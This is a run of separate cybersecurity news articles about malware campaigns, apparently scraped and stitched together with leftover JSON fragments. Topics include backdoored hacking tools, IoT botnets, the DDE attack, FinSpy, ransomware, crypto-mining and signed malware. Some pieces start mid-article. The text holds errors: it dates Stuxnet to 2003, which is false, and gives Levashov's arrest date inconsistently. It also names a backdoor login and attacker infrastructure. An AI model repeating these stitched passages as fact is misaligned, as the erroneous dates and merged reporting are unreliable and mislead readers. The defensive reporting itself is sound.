If you are searching for free hacking tools on the Internet, then beware—most freely available tools, claiming to be the swiss army knife for hackers, are nothing but a scam. For example, Cobian RAT and a Facebook hacking tool that we previously reported on The Hacker News actually could hack, but of the one who uses them and not the one you desire to hack. Now, a security researcher has spotted another hacking tool—this time a PHP script—which is freely available on multiple popular underground hacking forums and allows anyone to find vulnerable internet-connected IP Cameras running the vulnerable version of GoAhead embedded web-server. However, after closely analysing the scanning script, Newsky Security researcher Ankit Anubhav found that the tool also contains a secret backdoor, which essentially allows its creator to \"hack the hacker.\" \"For an attacker’s point of view, it can be very beneficial to hack a hacker,\" Anubhav said. \"For example, if a script kiddie owns a botnet of 10,000 IoT and if he gets hacked, the entire botnet is now in control of the attacker who got control of the system of this script kiddie. Hence, by exploiting one device, he can add thousands of botnets to his army.\" The rise of IoT botnet and release of Mirai's source code—the biggest IoT-based malware threat that emerged last year and took down Dyn DNS service—has encouraged criminal hackers to create their massive botnet either to launch DDoS attacks against their targets or to rent them to earn money. As shown in the self-explanatory flowchart, this IoT scanning script works in four steps: First, it scans a set of IP addresses to find GoAhead servers vulnerable to a previously disclosed authentication bypass vulnerability (CVE-2017-8225) in Wireless IP Camera (P2P) WIFI CAM devices. In the background, it secretly creates a backdoor user account (username: VM | password: Meme123) on the wannabe hacker's system, giving the attacker same privilege as root. Script also extracts the IP address of the wannabe hacker, allowing script author to access the compromised systems remotely. Moreover, it also runs another payload on the script kiddie’s system, eventually installing a well-known botnet, dubbed Kaiten. This tool is another example of backdoored hacking tools increasingly being distributed at various underground forums to hack the hacker. In September, a backdoored Cobian RAT builder kit was spotted on multiple underground hacking forums for free but was caught containing a backdoored module that aimed to provide the kit's authors access to all of the victim's data. Last year, we reported about another Facebook hacking tool, dubbed Remtasu, that actually was a Windows-based Trojan with the capability to access Facebook account credentials, but of the one who uses it to hack someone else. The bottom line: Watch out the free online stuff very carefully before using them." }

But what if your winning weapon betrays you? The popular 104-key Mantistek GK2 Mechanical Gaming Keyboard that costs around €49.66 has allegedly been caught silently recording everything you type on your keyboard and sending them to a server maintained by the Alibaba Group. This built-in keylogger in Mantistek GK2 Mechanical Gaming Keyboard was noticed by a few owners who headed on to an online forum to share this issue. According to Tom's Hardware, MantisTek keyboards utilise 'Cloud Driver' software, maybe for collecting analytic information, but has been caught sending sensitive information to servers tied to Alibaba. After analysing more closely, Tom's Hardware team found that Mantistek keyboard does not include a full-fledged keylogger. Instead, it captures how many times a key has been pressed and sending this data back to online servers. The affected users also provided a screenshot showing how all your plain-text keystrokes collected by the keyboard are being uploaded to a Chinese server located at IP address: 47.90.52.88. However, even if there's no malicious intent, capturing and uploading keystroke counts without users' consent violates trust and puts systems' security at risk by leaking sensitive information. Since Alibaba Group also sells cloud services like Google and Amazon, this collected information is not necessarily being sent to the Alibaba itself, but someone who is using its cloud service. Opening the IP address in question directly into a web browser and on a Chinese login page, which translates to \"Cloud mouse platform background management system\" and is maintained by Shenzhen Cytec Technology Co., Ltd. Reportedly, the MantisTek keyboard's software sends the collected data to two destinations at that IP address: /cms/json/putkeyusedata.php /cms/json/putuserevent.php The best way to prevent your keyboard from sending your keystrokes to the Alibaba server is to stop using your Mantistek GK2 Mechanical Gaming Keyboard until you hear back from the company about this issue. If you cannot prevent yourself from using the keyboard, but want to stop it from sending your key presses to the Alibaba server, just make sure the MantisTek Cloud Driver software is not running in the background, and block the CMS.exe executable in your firewall. To block the CMS.exe executable, add a new firewall rule for the MantisTek Cloud Driver in the \"Windows Defender Firewall With Advanced Security.\"" }

It's digital code signing certificates. A recent study conducted by the Cyber Security Research Institute (CSRI) this week revealed that stolen digital code-signing certificates are readily available for anyone to purchase on the dark web for up to $1,200. As you may know, digital certificates issued by a trusted certificate authority (CA) are used to cryptographically sign computer applications and software, and are trusted by your computer for execution of those programs without any warning messages. However, malware author and hackers who are always in search of advanced techniques to bypass security solutions have been abusing trusted digital certificates during recent years. Hackers use compromised code signing certificates associated with trusted software vendors in order to sign their malicious code, reducing the possibility of their malware being detected on targeted enterprise networks and consumer devices. The infamous Stuxnet worm that targeted Iranian nuclear processing facilities in 2003 also used legitimate digital certificates. Also, the recent CCleaner-tainted downloads infection was made possible due to digitally-signed software update. Stealthy Digitally-Signed Malware Is Increasingly Prevalent However, separate research conducted by a team of security researchers have found that digitally signed malware has become much more common than previously thought. The trio researchers—Doowon Kim, BumJun Kwon and Tudor Dumitras from the University of Maryland, College Park—said they found a total of 325 signed malware samples, of which 189 (58.2%) carried valid digital signatures while 136 carry malformed digital signatures. \"Such malformed signatures are useful for an adversary: we find that simply copying an Authenticode signature from a legitimate sample to an unsigned malware sample may help the malware bypass AV detection,\" the researchers said. Those 189 malware samples signed correctly were generated using 111 compromised unique certificates issued by recognized CAs and used to sign legitimate software. At the time of writing, 27 of these compromised certificates had been revoked, although malware signed by one of the remaining 84 certificates that were not revoked would still be trusted as long as carry a trusted timestamp. \"A large fraction (88.8%) of malware families rely on a single certificate, which suggests that the abusive certificates are mostly controlled by the malware authors rather than by third parties,\" the trio said. The researchers have released a list of the abusive certificates at signedmalware.org. Revoking Stolen Certificate Doesn't Stop Malware Immediately Even when a signature is not valid, the researchers found that at least 34 anti-virus products failed to check the certificate's validity, eventually allowing malicious code to run on the targeted system. The researchers also conducted an experiment to determine if malformed signatures can affect the anti-virus detections. To demonstrate this, they downloaded 5 random unsigned ransomware samples that almost all anti-virus programs detected as malicious. The trio then took two expired certificates that previously had been used to sign both legitimate software and in-the-wild malware and used them to sign each of the five ransomware samples. Top Antivirus Fail to Detect Malware Signed With Stolen Certificates When analysing the resulting ten new samples, the researchers found that many anti-virus products failed to detect the malware as malicious. The top three anti-virus products—nProtect, Tencent, and Paloalto—detected unsigned ransomware samples as malware, but considered eight of out ten crafted samples as benign. Even popular anti-virus engines from Kaspersky Labs, Microsoft, TrendMicro, Symantec, and Commodo, failed to detect some of the known malicious samples. Other affected anti-virus packages included CrowdStrike, Fortinet, Avira, Malwarebytes, SentinelOne, Sophos, TrendMicro and Qihoo, among others. \"We believe that this [inability in detecting malware samples] is due to the fact that AVs take digital signatures into account when filter and prioritize the list of files to scan, in order to reduce the overhead imposed on the user’s host,\" the researchers said. \"However, the incorrect implementation of Authenticode signature checks in many AVs gives malware authors the opportunity to evade detection with a simple and inexpensive method.\" The researchers said they reported this issue to the affected antivirus companies, and one of them had confirmed that their product fails to check the signatures correctly and they had planned to fix the issue. The researchers presented their findings at the Computer and Communications Security (CCS) conference in Dallas on Wednesday.

Yesterday some users spotted a fake version of the most popular WhatsApp messaging app for Android on the official Google Play Store that has already tricked more than one million users into downloading it. Dubbed Update WhatsApp Messenger, came from an app developer who pretended to be the actual WhatsApp service with the developer title \"WhatsApp Inc.\"—the same title the actual WhatsApp messenger uses on Google Play. You might be wondering how the sneaky app developer was able to use the same title as the legitimate Facebook-owned maker of the messaging client—thanks to a Unicode character space. The app maker added a Unicode character space after the actual WhatsApp Inc. name, which in computer code reads WhatsApp+Inc%C2%A0. However, this hidden character space at the end of the WhatsApp Inc. would be easily invisible to an average Android user browsing Google Play Store, allowing this dodgy version of the app to masquerade as a product of WhatsApp Inc. In other words, the titles used by the fake app maker and real WhatsApp service are different but appeared same to a user. According to Redditors, who first spotted this fake app on Friday, the app was not a chat app; instead, it served Android users with advertisements to download other apps. \"I've also installed the app and decompiled it,\" one Redditor said. \"The app itself has minimal permissions (internet access) but it's basically an ad-loaded wrapper which has some code to download a second apk, also called 'whatsapp.apk.' The app also tries to hide by not having a title and having a blank icon.\" Google has now removed the fake WhatsApp Android app from its official Play Store, but this incident once again marked the tech giant's failure to spot the scam on its app platform—even for the program that had more than a million downloads. It is an unfortunate truth that even after so many efforts by Google (even recently launched Bug Bounty Program), malicious apps continuously somehow managed to fool its Play Store's security mechanism and infect millions of Android users. Google Play Store is still surrounded by hundreds of other fake and malicious apps that trick users into downloading and installing them and potentially infect their smartphones to carry out malicious things without their knowledge. So, users are advised to be more vigilant while downloading apps not only from the third-party app store but also from official Play Store in order to protect themselves." }

Dubbed 'IoT_reaper,' first spotted in September by researchers at firm Qihoo 360, the new malware no longer depends on cracking weak passwords; instead, it exploits vulnerabilities in various IoT devices and enslaves them into a botnet network. IoT_reaper malware currently includes exploits for nine previously disclosed vulnerabilities in IoT devices from following manufactures: Dlink (routers) Netgear (routers) Linksys (routers) Goahead (cameras) JAWS (cameras) AVTECH (cameras) Vacron (NVR) Researchers believe IoT_reaper malware has already infected nearly two million devices and growing continuously at an extraordinary rate of 10,000 new devices per day. This is extremely worrying because it took only 100,000 infected devices for Mirai to took down DNS provider Dyn last year using a massive DDoS attack. Besides this, researchers noted that the malware also includes more than 100 DNS open resolvers, enabling it to launch DNS amplification attacks. \"Currently, this botnet is still in its early stages of expansion. But the author is actively modifying the code, which deserves our vigilance.\" Qihoo 360 researchers say. Meanwhile, researchers at CheckPoint are also warning of probably same IoT botnet, named \"IoTroop,\" that has already infected hundreds of thousands of organisations. \"It is too early to guess the intentions of the threat actors behind it, but with previous Botnet DDoS attacks essentially taking down the Internet, it is vital that organisations make proper preparations and defence mechanisms are put in place before attack strikes.\" researchers said. According to CheckPoint, IoTroop malware also exploits vulnerabilities in Wireless IP Camera devices from GoAhead, D-Link, TP-Link, AVTECH, Linksys, Synology and others. At this time it is not known who created this and why, but the DDoS threat landscape is skyrocketing and could reach tens of terabits-per-second in size. \"Our research suggests we are now experiencing the calm before an even more powerful storm.

Last week we reported how hackers could leveraging an old Microsoft Office feature called Dynamic Data Exchange (DDE), to perform malicious code execution on the targeted device without requiring Macros enabled or memory corruption. DDE protocol is one of the several methods that Microsoft uses to allow two running applications to share the same data. The protocol is being used by thousands of apps, including MS Excel, MS Word, Quattro Pro, and Visual Basic for one-time data transfers and for continuous exchanges for sending updates to one another. The DDE exploitation technique displays no \"security\" warnings to victims, except asking them if they want to execute the application specified in the command—although this popup alert could also be eliminated \"with proper syntax modification.\" Soon after the details of DDE attack technique went public, Cisco's Talos threat research group published a report about an attack campaign actively exploiting this attack technique in the wild to target several organisations with a fileless remote access trojan (RAT) called DNSMessenger. Necurs Botnet Using DDE Attack to Spread Locky Ransomware Now, hackers have been found using the Necurs Botnet—malware that currently controls over 6 million infected computers worldwide and sends millions of emails—to distribute Locky ransomware and TrickBot banking trojan using Word documents that leverage the newly discovered DDE attack technique, reported SANS ISC. Locky ransomware hackers previously relied on macros-based booby-trapped MS Office documents, but now they have updated the Nercus Botnet to deliver malware via the DDE exploit and gain an ability to take screenshots of the desktops of victims. \"What’s interesting about this new wave is that the downloader now contains new functionality to gather telemetry from victims,\" Symantec said in a blog post. \"It can take screen grabs and send them back to a remote server. There’s also an error-reporting capability that will send back details of any errors that the downloader encounters when it tries to carry out its activities.\" Hancitor Malware Using DDE Attack Another separate malware spam campaign discovered by security researchers has also been found distributing Hancitor malware (also known as Chanitor and Tordal) using Microsoft Office DDE exploit. Hancitor is a downloader that installs malicious payloads like Banking Trojans, data theft malware and Ransomware on infected machines and is usually delivered as a macro-enabled MS Office document in phishing emails. How to Protect Yourself From Word DDE Attacks? Since DDE is a Microsoft's legitimate feature, most antivirus solutions do not flag any warning or block MS Office documents with DDE fields, neither the tech company has any plans of issuing a patch that would remove its functionality. So, you can protect yourself and your organisation from such attacks by disabling the \"update automatic links at open\" option in the MS Office programs. To do so, Open Word → Select File → Options → Advanced and scroll down to General and then uncheck \"Update Automatic links at Open.\" However, the best way to protect yourself from such attacks is always to be suspicious of any uninvited document sent via an email and never click on links inside those documents unless adequately verifying the source." }

Usually, hackers exploit hardware and software vulnerabilities to hack ATMs and force them to spit out cash, but now anyone can simply buy a malware to steal millions in cash from ATMs. Hackers are selling ready-made ATM malware on an underground hacking forum that anybody can simply buy for around $5000, researchers at Kaspersky Lab discovered after spotting a forum post advertising the malware, dubbed Cutlet Maker. The forum post provides a brief description and a detailed manual for the malware toolkit designed to target various ATMs models with the help of a vendor API, without interacting with ATM users and their data. Therefore, this malware does not affect bank customers directly; instead, it is intended to trick the bank ATMs from a specific vendor to release cash without authorisation. The manual also mentions an infamous piece of ATM malware, dubbed Tyupkin, which was first analysed in 2014 by Kaspersky Lab and used by an international cybercrime gang to conduct Jackpotting attack and make Millions by infecting ATMs across Europe and beyond.

According to Kaspersky researchers, the functionality of the Cutlet Maker malware suggests that two people are supposed to be involved in the ATM money theft—the roles are called \"drop\" and \"drop master.\" \"Access to the dispense mechanism of CUTLET MAKER is password protected. Though there could be just one person with the c0decalc application needed to generate a password,\" the researchers say. \"Either network or physical access to an ATM is required to enter the code in the application text area and also to interact with the user interface.\" In order to operate, the application needs a special library, which is part of a proprietary ATM API and controls the cash dispenser unit—this shows how cyber \"criminals are using legitimate proprietary libraries and a small piece of code to dispense money from an ATM.\" The price of this ATM malware toolkit was $5000 at the time of Kaspersky's research.

Security researchers from Kaspersky Labs have discovered a new zero-day remote code execution vulnerability in Adobe Flash, which was being actively exploited in the wild by a group of advanced persistent threat actors, known as BlackOasis. The critical type confusion vulnerability, tracked as CVE-2017-11292, could lead to code execution and affects Flash Player 21.0.0.226 for major operating systems including Windows, Macintosh, Linux and Chrome OS. Researchers say BlackOasis is the same group of attackers which were also responsible for exploiting another zero-day vulnerability (CVE-2017-8759) discovered by FireEye researchers in September 2017. Also, the final FinSpy payload in the current attacks exploiting Flash zero-day (CVE-2017-11292) shares the same command and control (C&C) server as the payload used with CVE-2017-8759 (which is Windows .NET Framework remote code execution). So far BlackOasis has targeted victims in various countries including Russia, Iraq, Afghanistan, Nigeria, Libya, Jordan, Tunisia, Saudi Arabia, Iran, the Netherlands, Bahrain, United Kingdom and Angola. The newly reported Flash zero-day exploit is at least the 5th zero-day that BlackOasis group exploited since June 2015. The zero-day exploit is delivered through Microsoft Office documents, particularly Word, attached to a spam email, and embedded within the Word file includes an ActiveX object which contains the Flash exploit. The exploit deploys the FinSpy commercial malware as the attack's final payload. \"The Flash object contains an ActionScript which is responsible for extracting the exploit using a custom packer seen in other FinSpy exploits,\" the Kaspersky Labs researchers say. FinSpy is a highly secret surveillance tool that has previously been associated with Gamma Group, a British company that legally sells surveillance and espionage software to government agencies across the world. FinSpy, also known as FinFisher, has extensive spying capabilities on an infected system, including secretly conducting live surveillance by turning ON its webcams and microphones, recording everything the victim types on the keyboard, intercepting Skype calls, and exfiltration of files. To get into a target's system, FinSpy usually makes use of various attack vectors, including spear phishing, manual installation with physical access to the affected device, zero-day exploits, and watering hole attacks. \"The attack using the recently discovered zero-day exploit is the third time this year we have seen FinSpy distribution through exploits to zero-day vulnerabilities,\" said Anton Ivanov, lead malware analyst at Kaspersky Lab. \"Previously, actors deploying this malware abused critical issues in Microsoft Word and Adobe products. We believe the number of attacks relying on FinSpy software, supported by zero day exploits such as the one described here, will continue to grow.\" Kaspersky Lab reported the vulnerability to Adobe, and the company has addressed the vulnerability with the release of Adobe Flash Player versions 27.0.0.159 and 27.0.0.130. Just last month, ESET researchers discovered legitimate downloads of several popular apps like WhatsApp, Skype, VLC Player and WinRAR (reportedly compromised at the ISP level) that were also distributing FinSpy. So, businesses and government organizations around the world are strongly recommended to install the update from Adobe as soon as possible. Microsoft will also likely be releasing a security update to patch the Flash Player components used by its products." }

The basic aim—to violate normal operation of information systems, that may destabilize the situation in the country,\" the press release reads. \"The SBU experts received data that the attack can be conducted with the use of software updating, including public applied software. The mechanism of its realization will be similar to cyber-attack of June 2017.\" To protect themselves against the next large-scale cyber attack, the SBU advised businesses to follow some recommendations, which includes: Updating signatures of virus protection software on the server and in the workstation computers. Conducting redundancy of information, which is processed on the computer equipment. Providing daily updating of system software, including Windows operating system of all versions. Since the supply chain attacks are not easy to detect and prevent, users are strongly advised to keep regular backups of their important files on a separate drive or storage that are only temporarily connected for worst case scenarios. Most importantly, always keep a good antivirus on your system that can detect and block any malware intrusion before it can infect your device, and keep it up-to-date for latest infection-detection." }

Security researchers from Slovakia-based security software maker ESET have discovered a new Android ransomware that not just encrypts users’ data, but also locks them out of their devices by changing lock screen PIN. On top of that: DoubleLocker is the first-ever ransomware to misuse Android accessibility—a feature that provides users alternative ways to interact with their smartphone devices, and mainly misused by Android banking Trojans to steal banking credentials. \"Given its banking malware roots, DoubleLocker may well be turned into what could be called ransom-bankers,\" said Lukáš Štefanko, the malware researcher at ESET. \"Two-stage malware that first tries to wipe your bank or PayPal account and subsequently locks your device and data to request a ransom.\" Researchers believe DoubleLocker ransomware could be upgraded in future to steal banking credentials as well, other than just extorting money as ransom. First spotted in May this year, DoubleLocker Android ransomware is spreading as a fake Adobe Flash update via compromised websites. Here's How the DoubleLocker Ransomware Works: Once installed, the malware requests user for the activation of 'Google Play Services' accessibility feature, as shown in the demonstration video. After obtaining this accessibility permission, the malware abuses it to gain device's administrator rights and sets itself as a default home application (the launcher)—all without the user's knowledge. \"Setting itself as a default home app – a launcher – is a trick that improves the malware's persistence,\" explains Štefanko. \"Whenever the user clicks on the home button, the ransomware gets activated, and the device gets locked again. Thanks to using the accessibility service, the user does not know that they launch malware by hitting Home.\" Once executed, DoubleLocker first changes the device PIN to a random value that neither attacker knows nor stored anywhere and meanwhile the malware encrypts all the files using AES encryption algorithm. DoubleLocker ransomware demands 0.0130 BTC (approximately USD 74.38 at time of writing) and threatens victims to pay the ransom within 24 hours. If the ransom is paid, the attacker provides the decryption key to unlock the files and remotely resets the PIN to unlock the victim's device. How to Protect Yourself From DoubleLocker Ransomware According to the researchers, so far there is no way to unlock encrypted files, though, for non-rooted devices, users can factory-reset their phone to unlock the phone and get rid of the DoubleLocker ransomware. However, for rooted Android devices with debugging mode enabled, victims can use Android Debug Bridge (ADB) tool to reset PIN without formatting their phones. The best way to protect yourself from avoiding falling victims to such ransomware attacks is to always download apps from trusted sources, like Google play Store, and stick to verified developers. Also, never click on links provided in SMS or emails. Even if the email looks legit, go directly to the website of origin and verify any possible updates. Moreover, most importantly, keep a good antivirus app on your smartphone that can detect and block such malware before it can infect your device, and always keep it and other apps up-to-date." }

Active for more than a year and still ongoing, the malware campaign is being conducted by a hacking group called KovCoreG, which is well known for distributing Kovter ad fraud malware that was used in 2015 malicious ad campaigns, and most recently earlier in 2017. The KovCoreG hacking group initially took advantage of P0rnHub—one of the world's most visited adult websites—to distribute fake browser updates that worked on all three major Windows web browsers, including Chrome, Firefox, and Microsoft Edge/Internet Explorer. According to the Proofpoint researchers, the infections in this campaign first appeared on P0rnHub web pages via a legitimate advertising network called Traffic Junky, which tricked users into installing the Kovtar malware onto their systems. Among other malicious things, the Kovter malware is known for its unique persistence mechanism, allowing the malware to load itself after every reboot of the infected host. The Traffic Junky advertising network redirected users to a malicious website, where Chrome and Firefox users were shown a fake browser update window, while Internet Explorer and Edge users got a fake Flash update. \"The [infection] chain begins with a malicious redirect hosted on avertizingms[.]com, which inserts a call hosted behind KeyCDN, a major content delivery network,\" Proofpoint writes. The attackers used a number of filters and fingerprinting of \"the timezone, screen dimension, language (user/browser) history length of the current browser windows, and unique id creation via Mumour,\" in an effort to target users and evade analysis. Researchers said Chrome users were infected with a JavaScript which beaconed back to the server controlled by the attackers, preventing security analysts working through the infection chain if their IP had not \"checked in.\" \"This makes it extremely unlikely that the JavaScript can be run alone and provide the payload in a sandbox environment,\" Proofpoint writes. \"This is most likely why this component of the chain has not been documented previously.\" In this case, the attackers limited their campaign to click fraud to generate illicit revenue, but Proofpoint researchers believed the malware could easily be modified to spread ransomware, information stealing Trojans or any other malware. Both P0rnHub and Traffic Junky, according to the researchers, \"acted swiftly to remediate this threat upon notification.\" Although this particular infection chain was successfully shut down after the site operator and ad network got notified, the malware campaign is still ongoing elsewhere." }

Possibly, this could be a smart move for state-sponsored hackers to avoid being attributed easily. Security researchers from multiple security firms, including Arbor Networks and FireEye, independently discovered a series of malware campaigns primarily targeting aerospace, defence contractors and manufacturing sectors in various countries, including the United States, Thailand, South Korea and India. What's common? All these attack campaigns, conducted by various hacking groups, eventually install same information and password stealer malware—dubbed FormBook—on the targeted systems. FormBook is nothing but a \"malware-as-as-service,\" which is an affordable piece of data-stealing and form-grabbing malware that has been advertised in various hacking forums since early 2016. Anyone can rent FormBook for just $29 per week or $59 per month, which offers a range of advanced spying capabilities on target machines, including a keylogger, password stealer, network sniffer, taking the screenshots, web form data stealer and more. According to the researchers, attackers in each campaign are primarily using emails to distribute the FormBook malware as an attachment in different forms, including PDFs with malicious download links, DOC and XLS files with malicious macros, and archive files (ZIP, RAR, ACE, and ISOs) containing EXE payloads. Once installed on a target system, the malware injects itself into various processes and starts capturing keystrokes and extracts stored passwords and other sensitive data from multiple applications, including Google Chrome, Firefox, Skype, Safari, Vivaldi, Q-360, Microsoft Outlook, Mozilla Thunderbird, 3D-FTP, FileZilla and WinSCP. FormBook continuously sends all the stolen data to a remote command and control (C2) server which also allows the attacker to execute other commands on the targeted system, including start processes, shutdown and reboot the system, and stealing cookies. \"One of the malware's most interesting features is that it reads Windows’ ntdll.dll module from disk into memory, and calls its exported functions directly, rendering user-mode hooking and API monitoring mechanisms ineffective,\" FireEye says. \"The malware author calls this technique \"Lagos Island method\" (allegedly originating from a userland rootkit with this name).\" According to the researchers, FormBook was also seen downloading other malware families such as NanoCore in the last few weeks. The attackers can even use the data successfully harvested by FormBook for further cybercriminal activities including, identity theft, continued phishing operations, bank fraud and extortion. FormBook is neither sophisticated, nor difficult-to-detect malware, so the best way to protect yourself from this malware is to keep good antivirus software on your systems, and always keep it up-to-date." }

Peter Yuryevich Levashov, also known as Peter Severa, was arrested in April this year when he was travelling with his family to Barcelona, Spain from his home in Russia—a country without an extradition treaty with the United States—for his role in a huge computer botnet. However, since Levashov has previously worked with for Vladimir Putin's United Russia Party for ten years, he fears that the US authorities would torture him for information about his political work if sent there to face the charges against him. \"If I go to the U.S., I will die in a year. They want to get information of a military nature and about the United Russia party,\" RIA news agency quoted Levashov as saying. \"I will be tortured, within a year I will be killed, or I will kill myself.\" Levashov was accused of operating the Kelihos botnet—a global network of more than 100,000 infected computers used to deliver spam, steal login passwords and infect computers with ransomware and other malware since at least 2010. While initially it was speculated that Levashov was involved in 2016 U.S. election hacking, the FBI made it clear that the suspect was arrested due to his involvement in the Kelihos botnet and spamming targets for trying and forcing them to buy worthless stock. According to the FBI officials, Levashov used the same IP address to operate Kelihos botnet that he used to access his email and other online accounts in his name, including Apple iCloud and Google Gmail accounts. The Department of Justice's indictment said the Russian suspect allegedly used Kelihos to distribute hundreds of millions of spam e-mails every year, and pump-and-dump stock scams, especially targeting Microsoft Windows machines for infection. Besides conducting spamming operations, Levashov also allegedly used the Kelihos botnet to infect end-user computers with malware and harvest passwords to online and bank accounts belonging to thousands of Americans. The United States had requested Levashov's arrest, and after his arrest in April 2016, Russia in September filed a counter-extradition request for Levashov hours before the original extradition hearing. However, Spain's High Court has approved the U.S. extradition request of Levashov, who has been charged with wire fraud and unauthorised interception of electronic communications. United States prosecutors are seeking a 52-year jail sentence against Levashov, who has already denied the charges against him, Reuters reported. Levashov has now just three days to appeal his extradition to the United States." }

Security researchers at security firm ESET have spotted one such malware that infected hundreds of Windows web servers with a malicious cryptocurrency miner and helped cybercriminals made more than $63,000 worth of Monero (XMR) in just three months. According to a report published by ESET today, cybercriminals only made modifications to legitimate open source Monero mining software and exploited a known vulnerability in Microsoft IIS 6.0 to secretly install the miner on unpatched Windows servers. Although ESET's investigation does not identify the attackers, it reports that the attackers have been infecting unpatched Windows web servers with the cryptocurrency miner since at least May 2017 to mine 'Monero,' a Bitcoin-like cryptocurrency. The vulnerability (CVE-2017-7269) exploited by the attackers was discovered in March 2017 by Zhiniang Peng and Chen Wu and resides in the WebDAV service of Microsoft IIS version 6.0—the web server in Windows Server 2003 R2. Therefore, hackers are only targeting unpatched machines running Windows Server 2003 to make them part of a botnet, which has already helped them made over $63,000 worth of Monero. Since the vulnerability is on a web server, which is meant to be visible from the internet, it can be accessed and exploited by anyone. You can learn more about the vulnerability here. The newly discovered malware mines Monero that has a total market valuation of about $1.4 billion, which is far behind Bitcoin in market capitalisation, but cybercriminals’ love for Monero is due to its focus on privacy. Unlike Bitcoin, Monero offers untraceable transactions and is anonymous cryptocurrency in the world today. Another reason of hackers favouring Monero is that it uses a proof-of-work algorithm called CryptoNight, which suits computer or server CPUs and GPUs, while Bitcoin mining requires specific mining hardware. However, this is not the first time when analysts have spotted such malware mining Monero by stealing computing resources of compromised computers. In mid-May, Proofpoint researcher Kafeine discovered cryptocurrency mining malware, called 'Adylkuzz,' which was using EternalBlue exploit—created by the NSA and dumped last month by the Shadow Brokers in April—to infect unpatched Windows systems to mine Monero. A week before that, GuardiCore researchers discovered a new botnet malware, dubbed BondNet, that was also infecting Windows systems, with a combination of techniques, for primarily mining Monero." }

Publicly disclosed last year in October, Dirty COW was present in a section of the Linux kernel—a part of virtually every Linux distribution, including Red Hat, Debian, and Ubuntu—for years and was actively exploited in the wild. The vulnerability allows an unprivileged local attacker to gain root access through a race condition issue, gain access to read-only root-owned executable files, and permit remote attacks. However, security researchers from Trend Micro published a blog post on Monday disclosing that the privilege escalation vulnerability (CVE-2016-5195), known as Dirty COW, has now been actively exploited by a malware sample of ZNIU, detected as AndroidOS_ZNIU. This is the first time we have seen a malware sample to contain an exploit for the vulnerability designed to compromise devices running on the mobile platform. This Dirty Cow Exploit found in Over 1,200 Android Apps The malware uses the Dirty COW exploit to root Android devices via the copy-on-write (COW) mechanism in Android's Linux kernel and install a backdoor which can then be used by attackers to collect data and generate profit through a premium rate phone number. Trend Micro researchers detected the ZNIU malware in more than 1,200 malicious Android apps—some of which disguised themselves as pornography and gaming apps—alongside host websites containing malware rootkits that exploit Dirty Cow. While the Dirty Cow flaw impacts all versions of the Android operating system, the ZNIU's Dirty Cow exploit only affects Android devices with ARM/X86 64-bit architecture. However, the recent exploit can be used to bypass SELinux and plant backdoors. \"We monitored six ZNIU rootkits, four of which were Dirty COW exploits. The other two were KingoRoot, a rooting app, and the Iovyroot exploit (CVE-2015-1805),\" the researchers said. \"ZNIU used KingoRoot and Iovyroot because they can root ARM 32-bit CPU devices, which the rootkit for Dirty COW cannot.\" Here's How the ZNIU's Dirty Cow exploit Works Once downloaded and installed, the ZNIU malware-carrying app communicates with its command-and-control (C&C) server to check for code updates, while simultaneously the Dirty Cow exploit provides local privilege escalation to gain root access on the device, bypass system restrictions and \"plant a backdoor for potential remote control attacks in the future.\" The malware also harvests the carrier information of the user and attempts to send payments via premium SMS messages that were directed to a dummy company in China. Once the SMS transaction is over, the malware also deletes the messages from the device in order to erase evidence of any compromise. The researchers found the malware has already infected more than 5,000 Android users across 40 countries in recent weeks, with the majority of victims found in China and India, while other resides in the United States, Japan, Canada, Germany and Indonesia. Google has released an update for Android that, among other fixes, officially fixes the Dirty COW vulnerability. The tech giant also confirmed that its Play Protect now protects Android users against this malware. The easiest way to prevent yourself from being targeted by such clever malware is to avoid downloading apps from third-party sources and always stick to the official Google Play Store." }

Security researchers have discovered that legitimate downloads of several popular applications including WhatsApp, Skype, VLC Player and WinRAR have reportedly been compromised at the ISP level to distribute the infamous FinFisher spyware also known as FinSpy. FinSpy is a highly secret surveillance tool that has previously been associated with British company Gamma Group, a company that legally sells surveillance and espionage software to government agencies across the world. The spyware has extensive spying capabilities on an infected computer, including secretly conducting live surveillance by turning ON its webcams and microphones, recording everything the victim types with a keylogger, intercepting Skype calls, and exfiltration of files. In order to get into a target's machine, FinFisher usually uses various attack vectors, including spear phishing, manual installation with physical access to the device, zero-day exploits, and watering hole attacks. Your ISP May Be Helping Hackers To Spy On You However, a new report published today by ESET claimed that its researchers had discovered new surveillance campaigns utilizing new variants of FinFisher in seven countries, which comes bundled with a legitimate application. But how is this happening? Attackers are targeting victims using a man-in-the-middle (MitM) attack, where the internet service providers (ISP) are most likely operating as the \"middle man\"—bundling legitimate software downloads with FinFisher. \"We have seen this vector being used in two of the countries in which ESET systems detected the latest FinFisher spyware (in the five remaining countries, the campaigns have relied on traditional infection vectors),\" the researchers say. Previously published documents by WikiLeaks also indicated that the FinFisher maker also offered a tool called \"FinFly ISP,\" which is supposed to be deployed on ISP level with capabilities necessary for performing such a MitM attack. Also, the infection technique (using the HTTP 307 redirect) was implemented in the same way in the two affected countries ESET discovered being targeted by the new variants of FinFisher. However, the firm did not name the affected countries \"as not to put anyone in danger.\" Another fact which supports the ISP-level MitM attack is that all affected targets identified by the researchers within a country were using the same ISP. \"Finally, the very same redirection method and format have been used for internet content filtering by internet service providers in at least one of the affected countries,\" the ESET report reads. The popular applications targeted by the new variants of FinFisher include WhatsApp, Skype, VLC Player, Avast and WinRAR, and the ESET researchers said, \"virtually any application could be misused in this way.\" Here's How The Attack Works: When the target users search for one of the affected applications on legitimate websites and click on its download link, their browser is served a modified URL, which redirects victims to a trojanized installation package hosted on the attacker's server. This results in the installation of a version of the intended legitimate application bundled with the surveillance tool. \"The redirection is achieved by the legitimate download link being replaced by a malicious one,\" the researchers say. \"The malicious link is delivered to the user’s browser via an HTTP 307 Temporary Redirect status response code indicating that the requested content has been temporarily moved to a new URL.\" This whole redirection process, according to researchers, is \"invisible to the naked eye\" and occurs without user's knowledge. FinFisher Utilizing a Whole Lot of New Tricks The new tricks employed by the latest version of FinFisher kept it from being spotted by the researchers. The researchers also note that the latest version of FinFisher received several technical improvements in terms of stealthiness, including the use of custom code virtualization to protect the majority of its components like the kernel-mode driver. It also makes use of anti-disassembly tricks, and numerous anti-sandboxing, anti-debugging, anti-virtualization and anti-emulation tricks, aiming at compromising end-to-end encryption software and known privacy tools. One such secure messaging application, called Threema, was discovered by the researchers while they were analyzing the recent campaigns. \"FinFisher spyware masqueraded as an executable file named \"Threema.\" Such a file could be used to target privacy-concerned users, as the legitimate Threema application provides secure instant messaging with end-to-end encryption,\" the researchers say. \"Ironically, getting tricked into downloading and running the infected file would result in the privacy-seeking user being 